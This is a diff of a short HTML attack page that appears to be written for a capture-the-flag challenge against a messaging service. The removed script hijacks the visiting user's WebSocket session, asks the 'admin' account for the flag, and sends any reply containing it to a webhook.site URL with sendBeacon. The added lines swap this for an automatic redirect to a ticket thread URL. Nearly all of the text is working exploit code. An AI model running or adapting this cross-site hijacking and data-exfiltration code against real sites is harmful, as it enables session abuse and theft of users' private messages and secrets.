@@ -1,42 +1,11 @@
 <!DOCTYPE html>
 <html>
+<head>
+<meta http-equiv="refresh" content="0;url=https://vka-messenger.ru/desk/thread?ticket_uid=tkt_cbbc82868301bcbe">
+</head>
 <body>
 <script>
-const HOOK = 'https://webhook.site/1e71265b-5a68-4cf1-a141-76b6dbbc2a96';
-
-function log(msg) {
-  navigator.sendBeacon(HOOK + '?log=' + encodeURIComponent(msg));
-}
-
-log('start');
-
-const ws = new WebSocket('wss://vka-messenger.ru/ws');
-
-ws.onopen = () => log('ws_open');
-ws.onerror = (e) => log('ws_error');
-
-const state = {};
-
-ws.onmessage = (e) => {
-  const msg = JSON.parse(e.data);
-  log('msg_' + msg.type);
-
-  if (msg.type === 'hello') {
-    ws.send(JSON.stringify({ op: 'open_dm', username: 'admin' }));
-  }
-
-  if (msg.type === 'dm_opened' && !state.sent) {
-    state.sent = true;
-    state.chatId = msg.chat_id;
-    ws.send(JSON.stringify({ op: 'send_message', chat_id: msg.chat_id, body: 'flag' }));
-  }
-
-  if (msg.type === 'message' && msg.message?.body?.includes('vkactf{')) {
-    log('FLAG_' + msg.message.body);
-    navigator.sendBeacon(HOOK + '?flag=' + encodeURIComponent(msg.message.body));
-    window.__desklineDone = true;
-  }
-};
+location.href = 'https://vka-messenger.ru/desk/thread?ticket_uid=tkt_943ecdd49c153d58';
 </script>
 </body>
 </html>
